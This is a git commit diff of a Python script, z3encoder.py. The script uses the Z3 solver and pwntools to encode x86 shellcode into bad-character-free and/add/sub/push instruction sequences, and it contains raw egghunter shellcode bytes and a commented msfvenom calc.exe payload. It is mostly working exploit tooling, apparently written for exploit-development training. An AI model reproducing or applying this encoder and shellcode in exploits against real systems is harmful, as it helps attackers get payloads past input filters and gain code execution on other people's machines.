fd6677f5c2d3ef3280f7ea8d58de6e45e7cb5f68
A11riseforme <ycl0217@hotmail.com>
2020-06-01 02:05:59 +0800

    update z3encoder.py

--- z3encoder.py
+++ z3encoder.py
@@ -2,30 +2,17 @@
 
 from z3 import *
 from pwn import *
+import sys
 
-def solve(b):
-    s = Solver()
-    bad_chars = [ 0x0a, 0x0d, 0x2F, 0x3A, 0x3F, 0x40]
-    x, y, z = BitVecs('x y z', 32)
-    variables = [x, y, z]
 
-    for var in variables:
-        for k in range(0, 32, 8):
-            s.add(Extract(k+7, k, var) > BitVecVal(0x00, 8))
-            s.add(ULT(Extract(k+7, k, var),BitVecVal(0x80, 8)))
-            for c in bad_chars:
-                s.add(Extract(k+7, k, var) != BitVecVal(c, 8))
+# egghunter shellcode
+shellcode =  ""
+shellcode += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
+shellcode += "\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74"
+shellcode += "\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
 
-    s.add(x+y+z==b)
-
-    s.check()
-    s.model()
-    r = []
-    for i in s.model():
-        r.append(s.model()[i].as_long())
-
-    return r
-
+"""
+# $ msfvenom -p windows/exec CMD="calc.exe" -f python -v shellcode
 shellcode =  ""
 shellcode += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
 shellcode += "\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
@@ -45,29 +32,139 @@ shellcode += "\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
 shellcode += "\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
 shellcode += "\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
 shellcode += "\x63\x2e\x65\x78\x65\x00"
+"""
 
+# little-endian fill-up
 shellcode = shellcode[::-1]
 
+# extend the length to the multiple of 4
 shellcode += "\x41"*(math.ceil(len(shellcode)/4)*4-len(shellcode))
 
+# define the bad_chars here
+bad_chars = [0x0a, 0x0d, 0x2F, 0x3A, 0x3F, 0x40]
+
+is_zerofied = True
+
+def solve(leftover,target):
+    global bad_chars
+    global is_zerofied
+
+    nozeros = {}
+    zeros = {}
+    result = [nozeros,zeros]
+    leftovers = [leftover,0]
+
+    for op in range(2):
+        for ops in range(1,4):
+            s = Solver()
+            s.set("timeout",10000)
+            var = []
+            sign = []
+
+            for i in range(ops):
+                var.append(BitVecs('var_'+str(i),32)[0])
+                sign.append(Int('sign_'+str(i)))
+
+            for i in sign:
+                s.add(Or(i==1,i==-1))
+
+            for i in var:
+                for k in range(0,32,8):
+                    s.add(Extract(k+7, k, i) > BitVecVal(0x00, 8))
+                    s.add(ULT(Extract(k+7, k, i),BitVecVal(0x80, 8)))
+                    for c in bad_chars:
+                        s.add(Extract(k+7, k, i) != BitVecVal(c, 8))
+            func = lambda var,sign:var*Int2BV(sign,32)
+            s.add(leftovers[op]+sum(list(map(func,var,sign)))==target)
+            if s.check() == sat:
+                #print("found!")
+                #print(s.model())
+                for i in s.model():
+                    result[op][i.name()]=s.model()[i].as_long()
+                break
+
+    if len(zeros) == 0 and len(nozeros) == 0:
+        return {}
+    elif len(zeros) == 0:
+        is_zerofied = False
+        return nozeros
+    elif len(nozeros) == 0:
+        is_zerofied = True
+        return zeros
+    else:
+        # without zeroing, need more than 2 operations than with zeroing 
+        # then would rather zerofy first.
+        if len(zeros)+2<len(nozeros):
+            is_zerofied = True
+            return zeros
+        else:
+            is_zerofied = False
+            return nozeros
+
+
+def zerofy():
+    global bad_chars
+    s = Solver()
+    x,y = BitVecs('x y',32)
+    var = [x,y]
+    for i in var:
+        for k in range(0,32,8):
+            s.add(Extract(k+7,k,i) > BitVecVal(0x00,8))
+            s.add(ULT(Extract(k+7, k, i),BitVecVal(0x80, 8)))
+            for c in bad_chars:
+                s.add(Extract(k+7, k, i) != BitVecVal(c, 8))
+    s.add(x&y==0)
+    if s.check() == sat:
+        r = []
+        for i in s.model():
+            r.append(s.model()[i].as_long())
+        return r
+    return [0,0]
+
+
 final = b""
+
+# need "\x25" to perform `and` operation to zerofy eax
+if 0x25 in bad_chars:
+    print("cannot be decoded!")
+    sys.exit(0)
+
+zero1,zero2 = zerofy()
+
+if zero1==0 and zero2==0:
+    print("cannot be decoded!")
+    sys.exit(0)
+
+print("and eax, 0x%08x" % zero1)
+final += asm("and eax, 0x%08x" % zero1)
+print("and eax, 0x%08x\n" % zero2)
+final += asm("and eax, 0x%08x" % zero2)
+
+
+leftover = 0
 
 for i in range(int(len(shellcode)/4)):
     tmp = shellcode[i*4:i*4+4]
     target = int("0x"+''.join(str(hex(ord(j)))[2:].zfill(2) for j in tmp),16)
-    neg = 0xFFFFFFFF - target + 1
-    res = solve(neg)
-    print("and eax, 0x20202020")
-    final += asm('and eax, 0x20202020')
-    print("and eax, 0x02020202")
-    final += asm('and eax, 0x02020202')
-    for j in res:
-        print("sub eax, 0x%08x" % j)
-        final += asm('sub eax, 0x%02x' % j)
-    final += asm("push eax")
+    #print("target is 0x%08x,leftover = 0x%08x" % (target,leftover))
+    res = solve(leftover,target)
+    if not res:
+        print("cannot encode!")
+        sys.exit(0)
+    ops = int(len(res)/2)
+    if is_zerofied:
+        print("and eax, 0x%08x" % zero1)
+        final += asm("and eax, 0x%08x" % zero1)
+        print("and eax, 0x%08x" % zero2)
+        final += asm("and eax, 0x%08x" % zero2)
+    for i in range(ops):
+        if res['sign_'+str(i)] == -1:
+            print("sub eax, 0x%08x" % res['var_'+str(i)])
+            final += asm("sub eax, 0x%08x" % res['var_'+str(i)])
+        else:
+            print("add eax, 0x%08x" % res['var_'+str(i)])
+            final += asm("add eax, 0x%08x" % res['var_'+str(i)])
     print("push eax\n")
-
+    final += asm("push eax")
+    leftover = target
 print(''.join("\\x%02x" % i for i in final))
-
-
-
